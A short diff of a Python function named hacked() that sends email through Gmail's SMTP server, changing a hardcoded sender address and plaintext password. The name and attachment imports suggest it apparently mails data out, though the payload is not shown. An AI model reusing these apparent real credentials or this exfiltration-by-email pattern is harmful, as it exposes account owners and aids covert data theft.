@@ -32,7 +32,7 @@ def hacked():
         from email.mime.base import MIMEBase
         from email import encoders
 
-        fromaddr = "imvickykumar999@gmail.com"
+        fromaddr = "sagar.sws2000@gmail.com"
         toaddr = ["hellovickykumar123@gmail.com", fromaddr][1]
 
         msg = MIMEMultipart()
@@ -56,7 +56,7 @@ def hacked():
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
         try:
-            s.login(fromaddr, "@Hey_Vicks")
+            s.login(fromaddr, "Sagarsws2000@")
         except Exception as e:
             print(e)
 
